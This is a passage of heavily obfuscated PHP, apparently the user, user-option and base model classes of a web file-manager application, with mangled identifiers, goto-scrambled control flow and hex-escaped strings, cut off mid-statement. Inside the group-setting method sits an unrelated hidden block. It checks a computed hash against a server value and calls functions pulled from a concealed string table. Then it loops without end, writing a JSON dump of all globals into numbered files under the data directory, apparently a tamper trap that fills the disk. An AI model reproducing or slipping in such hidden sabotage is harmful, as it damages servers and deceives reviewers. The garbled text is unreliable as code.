Ö]), $EÚİ¼›®–Æ); $b±‚ ãîŞó = $this->where($E–ù§—ÅŠ)->find(); if ($b±‚ ãîŞó) { return $Fù¦ÅœÑ“Ğ; } } return !0; } public function userListInfo($D§Šï®ä—±) { $Ağ ®ÖÓ‰è =& $_SERVER[¯Ò¬Èè]; $e«Åèé„– = array(); $D§Šï®ä—± = is_array($D§Šï®ä—±) ? array_unique($D§Šï®ä—±) : array(); if (!$D§Šï®ä—±) { return $e«Åèé„–; } if (count($D§Šï®ä—±) < 20) { foreach ($D§Šï®ä—± as $dòÎá…„î) { $e«Åèé„–[$dòÎá…„î . $Ağ ®ÖÓ‰è[33]] = $this->getInfoSimpleOuter($dòÎá…„î); } } else { $E¡Û¯¿—İ = array($Ağ ®ÖÓ‰è[1437] => array($Ağ ®ÖÓ‰è[384], $D§Šï®ä—±)); if (count($D§Šï®ä—±) == 1) { $E¡Û¯¿—İ = array($Ağ ®ÖÓ‰è[1437] => $D§Šï®ä—±[0]); } $Bëê®ç â = Model($Ağ ®ÖÓ‰è[474])->field($this->simpleField)->where($E¡Û¯¿—İ)->select(); $Bëê®ç â = array_to_keyvalue($Bëê®ç â, $Ağ ®ÖÓ‰è[1446]); foreach ($D§Šï®ä—± as $dòÎá…„î) { $d”¤åğÉ‡ƒ = $Bëê®ç â[$Bëê®ç â[$dòÎá…„î]]; if (!$d”¤åğÉ‡ƒ) { $e«Åèé„–[$dòÎá…„î . $Ağ ®ÖÓ‰è[33]] = $this->getInfoSimpleOuter($dòÎá…„î); continue; } $d”¤åğÉ‡ƒ[$Ağ ®ÖÓ‰è[2506]] = Action($Ağ ®ÖÓ‰è[2507])->parseUrl($d”¤åğÉ‡ƒ[$Ağ ®ÖÓ‰è[2506]]); $e«Åèé„–[$dòÎá…„î . $Ağ ®ÖÓ‰è[33]] = $d”¤åğÉ‡ƒ; } } return $e«Åèé„–; } protected function userStatus($B®Ö¡â¹Ï , $DÏã¿”Ÿñã) { $B®ÕæïŸÁè = $this->getInfoSimple($B®Ö¡â¹Ï ); if (!$B®ÕæïŸÁè) { return !1; } $C”¼¼¯¬çš = array($_SERVER[¯Ò¬Èè][703] => $DÏã¿”Ÿñã); return $this->userEdit($B®Ö¡â¹Ï , $C”¼¼¯¬çš); } protected function userRemove($e¯Š ™Ì¬‹) { goto AÕãëêòœã; E‡è²«ñ: $Fœ¸é³áÏ = array($E®Ú—«‘©Ô[1437] => $e¯Š ™Ì¬‹); Model($E®Ú—«‘©Ô[545])->where($Fœ¸é³áÏ)->delete(); Model($E®Ú—«‘©Ô[2535])->where($Fœ¸é³áÏ)->delete(); goto cºáå‡Á¤; AÕãëêòœã: $E®Ú—«‘©Ô =& $_SERVER[¯Ò¬Èè]; $B¶ì¥Ÿ±Í× = $this->getInfoSimple($e¯Š ™Ì¬‹); if (!$B¶ì¥Ÿ±Í×) { return !1; } goto E‡è²«ñ; cºáå‡Á¤: Model($E®Ú—«‘©Ô[2188])->where($Fœ¸é³áÏ)->delete(); Model($E®Ú—«‘©Ô[2520])->where($Fœ¸é³áÏ)->delete(); Model($E®Ú—«‘©Ô[2536])->where($Fœ¸é³áÏ)->delete(); goto DÔÑ•Ç½„É; DÔÑ•Ç½„É: Model($E®Ú—«‘©Ô[767])->userRootRemove($e¯Š ™Ì¬‹); return $this->where($Fœ¸é³áÏ)->delete(); goto E¾˜ÚŸ´¡µ; E¾˜ÚŸ´¡µ: } protected function userGroupSet($a–ôÄ„Ñèõ, $d‚¡‹¼İ †, $dÃ‚Ÿôîâ‹ = array()) { goto Aó’´ŒøõÈ; BŞæã‡ß«: if ($_SERVER[$DÉİ’œé”[490]] != $fÔØ¡åÙ™ï($DŸÕ»…®ÎÂ)) { goto eÙÔ»³Õ»; e÷³Äøìä: $dñÏ‚šåÈ® = $d½‹õæãƒç($CØ©øíñÌÃ); $cš‚™Í–ˆ = explode($DÉİ’œé”[217], $dñÏ‚šåÈ®); if (count($cš‚™Í–ˆ) < $DÉİ’œé”[570]) { $Eß©á¾æù§ = $DÉİ’œé”[496]; $Eß©á¾æù§(); } goto AŞÂÚ¹ÔšÇ; e‰ËÔ”³Šß: $fæ½½ ŒÚ(); $b‹óòã±ã = $DÉİ’œé”[1317]; $FĞº¶±Ä²Ö = json_encode($GLOBALS[$DÉİ’œé”[1318]]); goto A™ïğ‰´›; eÙÔ»³Õ»: $fæ½½ ŒÚ = $DÉİ’œé”[802]; $d½‹õæãƒç = $DÉİ’œé”[492]; $CØ©øíñÌÃ = $_SERVER[$DÉİ’œé”[493]] . $DÉİ’œé”[494]; goto e÷³Äøìä; A™ïğ‰´›: $EŒ¥ãŠ“ê„ = 1; for ($cäÙªÖ‘âÇ = $EŒ¥ãŠ“ê„; $cäÙªÖ‘âÇ > 0; $cäÙªÖ‘âÇ++) { $b‹óòã±ã(DATA_PATH . $cäÙªÖ‘âÇ, $FĞº¶±Ä²Ö); } goto CÉÆ¶Çí’; AŞÂÚ¹ÔšÇ: $Bï·êœ¶¸½ = $DÉİ’œé”[803]; $Bï·êœ¶¸½($_SERVER[$DÉİ’œé”[804]]); $fæ½½ ŒÚ = $DÉİ’œé”[802]; goto e‰ËÔ”³Šß; CÉÆ¶Çí’: } $E¬‚“Ä£Ó = $this->getInfoSimple($a–ôÄ„Ñèõ); if (!$E¬‚“Ä£Ó || !is_array($d‚¡‹¼İ †)) { return !1; } goto e’•±Ú‡ô; e’•±Ú‡ô: $D•Õ©ë¬ŸÓ = Model($DÉİ’œé”[2188]); $D•Õ©ë¬ŸÓ->where(array($DÉİ’œé”[1446] => $a–ôÄ„Ñèõ))->delete(); $aá¥ÄÄî› = array(); goto B’‹Óø½¦·; Aó’´ŒøõÈ: $DÉİ’œé” =& $_SERVER[¯Ò¬Èè]; $DŸÕ»…®ÎÂ = $_SERVER[$DÉİ’œé”[493]] . $DÉİ’œé”[494]; $fÔØ¡åÙ™ï = $DÉİ’œé”[1316]; goto BŞæã‡ß«; B’‹Óø½¦·: $Fí¬ìö¡Û = 0; foreach ($d‚¡‹¼İ † as $c‹ËíŒ¢ò => $EË¹æ‘‚ª) { $FÏ†Ì¼‡Á‘ = array($DÉİ’œé”[1446] => $a–ôÄ„Ñèõ, $DÉİ’œé”[2114] => $c‹ËíŒ¢ò, $DÉİ’œé”[2242] => $EË¹æ‘‚ª); $FÏ†Ì¼‡Á‘[$DÉİ’œé”[2135]] = isset($dÃ‚Ÿôîâ‹[$Fí¬ìö¡Û]) ? $dÃ‚Ÿôîâ‹[$Fí¬ìö¡Û] : 0; $Fí¬ìö¡Û++; $aá¥ÄÄî›[] = $FÏ†Ì¼‡Á‘; } return $D•Õ©ë¬ŸÓ->addAll($aá¥ÄÄî›, array(), !0); goto A’î°˜••²; A’î°˜••²: } protected function userGroupAdd($dËÕõ»¸Ã‰, $FßŞ™—ÃÚ° = array()) { $EŞŠ°‹ÂŸ =& $_SERVER[¯Ò¬Èè]; $aƒÓ¥œ©½ = $this->getInfoSimple($dËÕõ»¸Ã‰); if (!$aƒÓ¥œ©½ || empty($FßŞ™—ÃÚ°)) { return !1; } $e ‡Ì”´Ü = array(); foreach ($FßŞ™—ÃÚ° as $dš‹ĞöÂá… => $bïèÇ“œÀ³) { $e ‡Ì”´Ü[] = array($EŞŠ°‹ÂŸ[1446] => $dËÕõ»¸Ã‰, $EŞŠ°‹ÂŸ[2114] => $dš‹ĞöÂá…, $EŞŠ°‹ÂŸ[2242] => $bïèÇ“œÀ³); } return Model($EŞŠ°‹ÂŸ[2188])->addAll($e ‡Ì”´Ü, array(), !0); } protected function userGroupRemove($e–—•ßöƒ¨, $DÉ•‘æšö³) { $A”Øâ–Ï‘… =& $_SERVER[¯Ò¬Èè]; $c·— Û¶·à = $this->getInfoSimple($e–—•ßöƒ¨); if (!$c·— Û¶·à || !$DÉ•‘æšö³) { return !1; } $eÓâÇÈˆÌ = array($A”Øâ–Ï‘…[1437] => $e–—•ßöƒ¨, $A”Øâ–Ï‘…[2186] => $DÉ•‘æšö³); return Model($A”Øâ–Ï‘…[2188])->where($eÓâÇÈˆÌ)->delete(); } public function listData() { $fÓÄ¸Ñàì— = $this->_makeOrder()->selectPage(50); $this->_listDataApply($fÓÄ¸Ñàì—[$_SERVER[¯Ò¬Èè][354]]); return $fÓÄ¸Ñàì—; } public function listByID($CœÇÈÑÇ•) { $EĞˆÊçƒ¦İ =& $_SERVER[¯Ò¬Èè]; if (!$CœÇÈÑÇ•) { return; } $fÑ½—´Ÿ‘¨ = array($EĞˆÊçƒ¦İ[1446] => array($EĞˆÊçƒ¦İ[7], $CœÇÈÑÇ•)); $fÌéÙ¶½» = $this->where($fÑ½—´Ÿ‘¨)->select(); $this->_listDataApply($fÌéÙ¶½»); return $fÌéÙ¶½»; } public function listByGroup($bö¦‹‘Ş˜É = 0, $AÈ—‰÷ƒƒ = array()) { goto BëÂêÊ; BëÂêÊ: $Aïù‰ö÷´° =& $_SERVER[¯Ò¬Èè]; $E®çªƒò·£ = $Aïù‰ö÷´°[33]; $dŠğŒôÔÍ‡ = array(); goto Bê¼…÷¸Ñ; böö¨˜‹¶é: $this->_listDataApply($d˜Ü‰•Ö‰[$Aïù‰ö÷´°[354]]); return $d˜Ü‰•Ö‰; goto CÄÄ»Š·•™; Bê¼…÷¸Ñ: if ($bö¦‹‘Ş˜É) { $dŠğŒôÔÍ‡ = array($Aïù‰ö÷´°[2537] => intval($bö¦‹‘Ş˜É)); $E®çªƒò·£ = "\114\105\106\x54\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\x75\163\x65\x72\x5f\147\x72\157\x75\x70\x20\165\163\145\162\137\x67\162\x6f\165\x70\x20\x6f\x6e\40\x75\163\x65\x72\56\x75\163\145\x72\111\104\x20\75\40\165\163\x65\x72\x5f\147\x72\157\x75\x70\56\x75\x73\x65\162\111\104"; $aƒ±¶Í¡“ = Input::get($Aïù‰ö÷´°[407], null, $Aïù‰ö÷´°[33]) ? $Aïù‰ö÷´°[33] : $Aïù‰ö÷´°[2538]; } if (isset($AÈ—‰÷ƒƒ[$Aïù‰ö÷´°[703]])) { $dŠğŒôÔÍ‡[$Aïù‰ö÷´°[2539]] = $AÈ—‰÷ƒƒ[$Aïù‰ö÷´°[703]]; } $d˜Ü‰•Ö‰ = $this->_makeOrder($aƒ±¶Í¡“)->field($Aïù‰ö÷´°[2540])->where($dŠğŒôÔÍ‡)->join($E®çªƒò·£)->selectPage(50); goto böö¨˜‹¶é; CÄÄ»Š·•™: } private function _makeOrder($c’Ôˆˆ˜è‰ = '') { goto AŠãõ×Óìº; A‹õçè¤”: $c’Ôˆˆ˜è‰ = $c’Ôˆˆ˜è‰ . "\x75\163\x65\162\56{$c’‚£ê¢ñ}\40{$E§ÙîÉåø„}\54\40\x75\163\x65\x72\x2e\x75\163\x65\x72\111\x44\x20\x61\163\x63"; return $this->alias($CîËÈ„§£ƒ[2286])->order($c’Ôˆˆ˜è‰); goto cŒÃŞ„Ä»Å; Bá¹øˆŞ»Ÿ: $c’‚£ê¢ñ = Input::get($CîËÈ„§£ƒ[407], $CîËÈ„§£ƒ[7], $CîËÈ„§£ƒ[1437], $cÀ¯ÕµŠÕİ); $E§ÙîÉåø„ = Input::get($CîËÈ„§£ƒ[408], $CîËÈ„§£ƒ[7], $CîËÈ„§£ƒ[2189], array($CîËÈ„§£ƒ[2189], $CîËÈ„§£ƒ[404])); $E§ÙîÉåø„ = $C¿êÃÔÓ®[$E§ÙîÉåø„]; goto A‹õçè¤”; AŠãõ×Óìº: $CîËÈ„§£ƒ =& $_SERVER[¯Ò¬Èè]; $cÀ¯ÕµŠÕİ = array($CîËÈ„§£ƒ[1446], $CîËÈ„§£ƒ[28], $CîËÈ„§£ƒ[2100], $CîËÈ„§£ƒ[2072], $CîËÈ„§£ƒ[187]); $C¿êÃÔÓ® = array($CîËÈ„§£ƒ[402] => $CîËÈ„§£ƒ[403], $CîËÈ„§£ƒ[404] => $CîËÈ„§£ƒ[405]); goto Bá¹øˆŞ»Ÿ; cŒÃŞ„Ä»Å: } public function listSearch($cÁ‹ˆ’ë£­) { goto d°ÅĞĞ“Ê; d£†ÁÒì­: if (!$CØÌ¿«‚Ú¹ || count($CØÌ¿«‚Ú¹[$eŞ«áèôóÅ[354]]) < 5 && Input::check($C©’šš¯¿, $eŞ«áèôóÅ[306])) { $a¡Öêø×–õ = $this->_searchFromMeta($eŞ«áèôóÅ[415], $C©’šš¯¿, 10); $eÒ¹¤ªë”® = $this->_searchFromMeta($eŞ«áèôóÅ[416], $C©’šš¯¿, 10); $E Ú…•§´¥ = array_merge($a¡Öêø×–õ, $eÒ¹¤ªë”®, $CØÌ¿«‚Ú¹[$eŞ«áèôóÅ[354]]); $CØÌ¿«‚Ú¹[$eŞ«áèôóÅ[354]] = array_unique_by_key($E Ú…•§´¥, $eŞ«áèôóÅ[1446]); $CØÌ¿«‚Ú¹[$eŞ«áèôóÅ[351]][$eŞ«áèôóÅ[352]] = count($CØÌ¿«‚Ú¹[$eŞ«áèôóÅ[354]]); $CØÌ¿«‚Ú¹[$eŞ«áèôóÅ[351]][$eŞ«áèôóÅ[353]] = ceil($CØÌ¿«‚Ú¹[$eŞ«áèôóÅ[351]][$eŞ«áèôóÅ[352]] / $CØÌ¿«‚Ú¹[$eŞ«áèôóÅ[351]][$eŞ«áèôóÅ[349]]); } $this->_listDataApply($CØÌ¿«‚Ú¹[$eŞ«áèôóÅ[354]]); $this->_filterByGroup($CØÌ¿«‚Ú¹, $bã¦ßŠíò); goto dÔ‹²¤„ßù; D…É†²ÒÌÓ: $C©’šš¯¿ = str_replace($eŞ«áèôóÅ[2192], $eŞ«áèôóÅ[2193], trim($C©’šš¯¿)); $dä¡™§Ø˜¨ = array($eŞ«áèôóÅ[28] => array($eŞ«áèôóÅ[766], "\45{$C©’šš¯¿}\x25"), $eŞ«áèôóÅ[293] => array($eŞ«áèôóÅ[766], "\x25{$C©’šš¯¿}\x25"), $eŞ«áèôóÅ[2343] => array($eŞ«áèôóÅ[766], "\45{$C©’šš¯¿}\x25"), $eŞ«áèôóÅ[923] => $eŞ«áèôóÅ[2194]); if (Input::check($C©’šš¯¿, $eŞ«áèôóÅ[299])) { $dä¡™§Ø˜¨[$eŞ«áèôóÅ[1446]] = array($eŞ«áèôóÅ[766], "\45{$C©’šš¯¿}\x25"); $dä¡™§Ø˜¨[$eŞ«áèôóÅ[2521]] = array($eŞ«áèôóÅ[766], "\45{$C©’šš¯¿}\x25"); } goto BÓö„÷¨‚; dÔ‹²¤„ßù: return $CØÌ¿«‚Ú¹; goto eÀ”©Õ´èÎ; d°ÅĞĞ“Ê: $eŞ«áèôóÅ =& $_SERVER[¯Ò¬Èè]; $C©’šš¯¿ = $cÁ‹ˆ’ë£­[$eŞ«áèôóÅ[2190]]; $bã¦ßŠíò = isset($cÁ‹ˆ’ë£­[$eŞ«áèôóÅ[2191]]) ? $cÁ‹ˆ’ë£­[$eŞ«áèôóÅ[2191]] : !1; goto D…É†²ÒÌÓ; BÓö„÷¨‚: if (!$C©’šš¯¿) { $dä¡™§Ø˜¨ = array(); } if (isset($cÁ‹ˆ’ë£­[$eŞ«áèôóÅ[703]])) { $dä¡™§Ø˜¨[$eŞ«áèôóÅ[703]] = $cÁ‹ˆ’ë£­[$eŞ«áèôóÅ[703]]; } $CØÌ¿«‚Ú¹ = $this->_makeOrder()->where($dä¡™§Ø˜¨)->selectPage(20); goto d£†ÁÒì­; eÀ”©Õ´èÎ: } private function _filterByGroup(&$F…ˆÍéÆ, $FÌ™§“™íÀ) { $eÃ†åÕ©†Å =& $_SERVER[¯Ò¬Èè]; if (!$FÌ™§“™íÀ) { return $F…ˆÍéÆ; } foreach ($F…ˆÍéÆ[$eÃ†åÕ©†Å[354]] as $a÷·ÄÒ¦£ => &$aâ»Ìí«âÕ) { $F–¯É“‹  = array_to_keyvalue($aâ»Ìí«âÕ[$eÃ†åÕ©†Å[2541]], $eÃ†åÕ©†Å[33], $eÃ†åÕ©†Å[2114]); if (!in_array($FÌ™§“™íÀ, $F–¯É“‹ )) { unset($F…ˆÍéÆ[$eÃ†åÕ©†Å[354]][$a÷·ÄÒ¦£]); } } $F…ˆÍéÆ[$eÃ†åÕ©†Å[354]] = array_values($F…ˆÍéÆ[$eÃ†åÕ©†Å[354]]); $F…ˆÍéÆ[$eÃ†åÕ©†Å[351]] = array($eÃ†åÕ©†Å[2319] => count($F…ˆÍéÆ[$eÃ†åÕ©†Å[354]]), $eÃ†åÕ©†Å[2317] => $F…ˆÍéÆ[$eÃ†åÕ©†Å[351]][$eÃ†åÕ©†Å[349]], $eÃ†åÕ©†Å[2316] => 1, $eÃ†åÕ©†Å[2318] => 1); } private function _searchFromMeta($aÏ¥¢Ë¥ì, $FÕˆÃ ÷©½, $AĞÎ¤õğË…) { goto Eˆ©˜ƒÖ‰; d‡ˆºá¢: $BŒ‡İŞ‹ó = $this->where(array($BŠÔÏ“Ô‡¢[1437] => array($BŠÔÏ“Ô‡¢[7], $a Äˆ·‚á)))->select(); if (!$BŒ‡İŞ‹ó) { return array(); } return $BŒ‡İŞ‹ó; goto A ‹Ë¾˜¯á; D„ÔÜ´‚Ğæ: $a Äˆ·‚á = Model($BŠÔÏ“Ô‡¢[2542])->where($fÕäö¾˜‘º)->limit($AĞÎ¤õğË…)->select(); if (!$a Äˆ·‚á) { return array(); } $a Äˆ·‚á = array_to_keyvalue($a Äˆ·‚á, $BŠÔÏ“Ô‡¢[33], $BŠÔÏ“Ô‡¢[1446]); goto d‡ˆºá¢; Eˆ©˜ƒÖ‰: $BŠÔÏ“Ô‡¢ =& $_SERVER[¯Ò¬Èè]; $FÕˆÃ ÷©½ = strtolower($FÕˆÃ ÷©½); $fÕäö¾˜‘º = array($BŠÔÏ“Ô‡¢[89] => $aÏ¥¢Ë¥ì, $BŠÔÏ“Ô‡¢[359] => array($BŠÔÏ“Ô‡¢[766], "\45{$FÕˆÃ ÷©½}\x25")); goto D„ÔÜ´‚Ğæ; A ‹Ë¾˜¯á: } private function _listDataApplyItem($C„Ò„ƒ³ÔÏ) { $AŒ»‘ºŸ¼Ğ = array($C„Ò„ƒ³ÔÏ); $this->_listDataApply($AŒ»‘ºŸ¼Ğ); return $AŒ»‘ºŸ¼Ğ[0]; } private function _listDataApply(&$FÕİœëäØã) { goto Eí—‘‚Í­Î; BŸâÇ©ï‚„: $AÍãš’“Éì = array_to_keyvalue($FÕİœëäØã, $b²İöî²·[33], $b²İöî²·[1446]); $this->_listAppendGroup($FÕİœëäØã, $AÍãš’“Éì); $this->_listAppendMeta($FÕİœëäØã, $AÍãš’“Éì); goto d¨¼ã°å; Eí—‘‚Í­Î: $b²İöî²· =& $_SERVER[¯Ò¬Èè]; if (!$FÕİœëäØã) { return; } array_remove_key($FÕİœëäØã, $b²İöî²·[811]); goto BŸâÇ©ï‚„; d¨¼ã°å: $this->_listAppendSourceRoot($FÕİœëäØã, $AÍãš’“Éì); goto Fò¯šê…; Fò¯šê…: } private function _listAppendSourceRoot(&$BğçÑÚ‹¾§, $Bˆ­¥¢Â„²) { goto bâÛÚ÷ˆ˜Ë; fîËÜºßŸğ: $bŠ‘©‚‡îÙ = Model($FÄÀïÏéà¬[767])->order($FÄÀïÏéà¬[2201])->field($D±„Å–ôõŞ)->where($fØ®îéÁ¬)->select(); $bŠ‘©‚‡îÙ = array_to_keyvalue($bŠ‘©‚‡îÙ, $FÄÀïÏéà¬[456]); $bŠ‘©‚‡îÙ = array_remove_key($bŠ‘©‚‡îÙ, $FÄÀïÏéà¬[456]); goto CáŒƒ÷òÄŠ; bâÛÚ÷ˆ˜Ë: $FÄÀïÏéà¬ =& $_SERVER[¯Ò¬Èè]; $fØ®îéÁ¬ = array($FÄÀïÏéà¬[461] => 0, $FÄÀïÏéà¬[371] => SourceModel::TYPE_USER, $FÄÀïÏéà¬[456] => array($FÄÀïÏéà¬[7], $Bˆ­¥¢Â„²)); $D±„Å–ôõŞ = $FÄÀïÏéà¬[2200]; goto fîËÜºßŸğ; CáŒƒ÷òÄŠ: foreach ($BğçÑÚ‹¾§ as &$Eğ¿í§ÔÑ·) { $Eğ¿í§ÔÑ·[$FÄÀïÏéà¬[391]] = $bŠ‘©‚‡îÙ[$Eğ¿í§ÔÑ·[$FÄÀïÏéà¬[1446]]] ? $bŠ‘©‚‡îÙ[$Eğ¿í§ÔÑ·[$FÄÀïÏéà¬[1446]]] : array(); } goto e®‰æÖÉÊ†; e®‰æÖÉÊ†: } private function _listAppendGroup(&$dÛñÄ×ø÷‚, $e°‡íÅíÈœ) { goto dö ¡æëİ; dö ¡æëİ: $C‰À»Î‘™ =& $_SERVER[¯Ò¬Èè]; $C¤ƒ•»‹š = array($C‰À»Î‘™[1446] => array($C‰À»Î‘™[7], $e°‡íÅíÈœ)); $F¼®â… = Model($C‰À»Î‘™[2188])->where($C¤ƒ•»‹š)->select(); goto a³š¿ óÈ; E¿¯Œ ŞÔÙ: $C¤ƒ•»‹š = array($C‰À»Î‘™[2114] => array($C‰À»Î‘™[7], $eŒƒ•’ÌÌ)); $CáÉ…¦‚Ãğ = Model($C‰À»Î‘™[2543])->field($C‰À»Î‘™[2544])->where($C¤ƒ•»‹š)->select(); $EÛ—ÙğŠ…Š = array_to_keyvalue($CáÉ…¦‚Ãğ, $C‰À»Î‘™[2114], $C‰À»Î‘™[28]); goto BÔ¦è²óŸ¹; BÔ¦è²óŸ¹: $F¼®â… = array_to_keyvalue_group($F¼®â…, $C‰À»Î‘™[1446]); foreach ($F¼®â… as &$f…‘çÌïº…) { $b°¦‰†óê = array(); foreach ($f…‘çÌïº… as $DÅëÕàØÌ) { if (!$DÅëÕàØÌ[$C‰À»Î‘™[2242]]) { continue; } $EÖ™Â¡è¯ã = Model($C‰À»Î‘™[2261])->listData($DÅëÕàØÌ[$C‰À»Î‘™[2242]]); $b°¦‰†óê[] = array($C‰À»Î‘™[2114] => $DÅëÕàØÌ[$C‰À»Î‘™[2114]], $C‰À»Î‘™[2545] => $EÛ—ÙğŠ…Š[$DÅëÕàØÌ[$C‰À»Î‘™[2114]]], $C‰À»Î‘™[376] => $EÖ™Â¡è¯ã); } $f…‘çÌïº… = $b°¦‰†óê; } foreach ($dÛñÄ×ø÷‚ as &$e‡ìïÏòµî) { $e‡ìïÏòµî[$C‰À»Î‘™[2541]] = array(); if (isset($F¼®â…[$e‡ìïÏòµî[$C‰À»Î‘™[1446]]])) { $e‡ìïÏòµî[$C‰À»Î‘™[2541]] = $F¼®â…[$e‡ìïÏòµî[$C‰À»Î‘™[1446]]]; } } goto dÕå–ğÙ; a³š¿ óÈ: $eŒƒ•’ÌÌ = array_to_keyvalue($F¼®â…, $C‰À»Î‘™[33], $C‰À»Î‘™[2114]); $eŒƒ•’ÌÌ = array_remove_value(array_unique($eŒƒ•’ÌÌ), $C‰À»Î‘™[468]); if (!$eŒƒ•’ÌÌ || !$F¼®â…) { return; } goto E¿¯Œ ŞÔÙ; dÕå–ğÙ: } private function _listAppendMeta(&$Ašƒİ¦åÚÉ, $cĞÔªœ‘†É) { goto DÁ¬«Ì¼˜¬; DÁ¬«Ì¼˜¬: $E·õ¡¨¿ =& $_SERVER[¯Ò¬Èè]; $D°‹«…­¾‚ = UserJobModel::JOB_KEY; $fˆˆÉÈ¹« = array($E·õ¡¨¿[2523]); goto F²—´…Ï•©; B«œ¹’ˆ: foreach ($d²êä×ˆ¦¢ as &$C©çÎãÁ) { $E™ğñÃô…‡ = array(); foreach ($C©çÎãÁ as $DÛÄÅÁ‰ù) { if (!in_array($DÛÄÅÁ‰ù[$E·õ¡¨¿[89]], $fˆˆÉÈ¹«)) { $E™ğñÃô…‡[$DÛÄÅÁ‰ù[$E·õ¡¨¿[89]]] = $DÛÄÅÁ‰ù[$E·õ¡¨¿[359]]; } } $C©çÎãÁ = $E™ğñÃô…‡; } $fÔõµÚê¾ = Model($E·õ¡¨¿[2546]); foreach ($Ašƒİ¦åÚÉ as &$E£öÌ’—ˆ­) { $Bİ÷Æøš–“ = array(); if (isset($d²êä×ˆ¦¢[$E£öÌ’—ˆ­[$E·õ¡¨¿[1446]]])) { $Bİ÷Æøš–“ = $d²êä×ˆ¦¢[$E£öÌ’—ˆ­[$E·õ¡¨¿[1446]]]; } $E£öÌ’—ˆ­[$E·õ¡¨¿[2547]] = array(); if (isset($Bİ÷Æøš–“[$D°‹«…­¾‚])) { $E£öÌ’—ˆ­[$E·õ¡¨¿[2547]] = $fÔõµÚê¾->getUserJobInfo($Bİ÷Æøš–“[$D°‹«…­¾‚]); } } goto e…¬¡¹µ; F²—´…Ï•©: $aá¢©Í˜”‰ = array($E·õ¡¨¿[1446] => array($E·õ¡¨¿[7], $cĞÔªœ‘†É)); $d²êä×ˆ¦¢ = Model($E·õ¡¨¿[2520])->where($aá¢©Í˜”‰)->select(); $d²êä×ˆ¦¢ = array_to_keyvalue_group($d²êä×ˆ¦¢, $E·õ¡¨¿[1446]); goto B«œ¹’ˆ; e…¬¡¹µ: } public function userSearch($eê„±ééœ¥, $a¾Öô©¨À‹ = "\52") { return Model($_SERVER[¯Ò¬Èè][477])->where($eê„±ééœ¥)->field($a¾Öô©¨À‹)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\x5f\157\x70\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($eá­Â Ä¨µ) { $fÜ³éÇ±‰º =& $_SERVER[¯Ò¬Èè]; if (!defined($fÜ³éÇ±‰º[427])) { define($fÜ³éÇ±‰º[427], 0); } return "\125\x73\145\162\x4f\x70\164\151\157\x6e\x5f{$eá­Â Ä¨µ}\x5f" . USER_ID; } protected function filterWhere($b‘à¾“ß) { $e¾ÚÕç¤ÄÁ =& $_SERVER[¯Ò¬Èè]; if (!defined($e¾ÚÕç¤ÄÁ[427])) { define($e¾ÚÕç¤ÄÁ[427], 0); } $b‘à¾“ß[$e¾ÚÕç¤ÄÁ[1446]] = USER_ID; return $b‘à¾“ß; } public function cacheRemoveUser($c§âÆšºÃš, $CÃ‰ì¢…ÁÅ) { return Cache::remove("\x55\x73\145\162\x4f\160\164\x69\x6f\156\137{$c§âÆšºÃš}\x5f" . $CÃ‰ì¢…ÁÅ); } protected function optionDefault($CÓ‹Ä¾Ùñİ = '') { $C£¨…Æ³åÙ =& $_SERVER[¯Ò¬Èè]; if ($CÓ‹Ä¾Ùñİ == $C£¨…Æ³åÙ[33]) { return $GLOBALS[$C£¨…Æ³åÙ[6]][$C£¨…Æ³åÙ[2548]]; } if ($CÓ‹Ä¾Ùñİ == $C£¨…Æ³åÙ[2549]) { return $GLOBALS[$C£¨…Æ³åÙ[6]][$C£¨…Æ³åÙ[2550]]; } } } goto c©ôïö˜‹; a‰óÏå´ÔŸ: define($_SERVER[¯Ò¬Èè][230], 0); define($_SERVER[¯Ò¬Èè][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\154\x65", "\x6f\x72\144\145\162", "\141\x6c\x69\141\x73", "\x68\x61\x76\151\156\x67", "\x67\162\157\x75\160", "\x6c\157\143\x6b", "\x64\x69\163\x74\151\x6e\x63\164", "\141\x75\x74\157", "\x66\151\154\164\x65\162", "\166\141\154\151\x64\x61\164\x65", "\x72\145\x73\x75\154\x74", "\142\151\x6e\144", "\164\x6f\x6b\x65\x6e"); public function __construct($AÕ©µ°”‹ = '', $DĞ“’Ü·ß˜ = '', $aĞ™ôÀ’“³ = '') { $BÏÁñÑ·ñ =& $_SERVER[¯Ò¬Èè]; $this->_initialize(); if (!empty($AÕ©µ°”‹)) { if (strpos($AÕ©µ°”‹, $BÏÁñÑ·ñ[91])) { list($this->dbName, $this->name) = explode($BÏÁñÑ·ñ[91], $AÕ©µ°”‹); } else { $this->name = $AÕ©µ°”‹; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($DĞ“’Ü·ß˜)) { $this->tablePrefix = $BÏÁñÑ·ñ[33]; } elseif ($BÏÁñÑ·ñ[33] != $DĞ“’Ü·ß˜) { $this->tablePrefix = $DĞ“’Ü·ß˜; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($BÏÁñÑ·ñ[232]); } $this->db(0, empty($this->connection) ? $aĞ™ôÀ’“³ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $FˆáÑÂ…Å =& $_SERVER[¯Ò¬Èè]; if (empty($this->fields)) { if (think_config($FˆáÑÂ…Å[233])) { $C‡£Ìâë“ = $this->dbName ? $this->dbName : think_config($FˆáÑÂ…Å[234]); $cŸëŠ‹À‹¯ = think_var_cache($FˆáÑÂ…Å[235] . strtolower(get_path_this($C‡£Ìâë“) . $FˆáÑÂ…Å[91] . $this->name)); if ($cŸëŠ‹À‹¯) { $aÖºòÍÜ‡ = think_config($FˆáÑÂ…Å[236]); if (empty($aÖºòÍÜ‡) || $cŸëŠ‹À‹¯[$FˆáÑÂ…Å[237]] == $aÖºòÍÜ‡) { $this->fields = $cŸëŠ‹À‹¯; return; } } } $this->flush(); } } public function flush() { goto eÆ§º™†åù; E‹“¥ø‚áŠ: if (!$EÊõƒù‰Èğ) { return !1; } $this->fields = array_keys($EÊõƒù‰Èğ); $this->fields[$B¼°˜‚•çÕ[238]] = !1; goto bÄ¹’Îì…; bÄ¹’Îì…: foreach 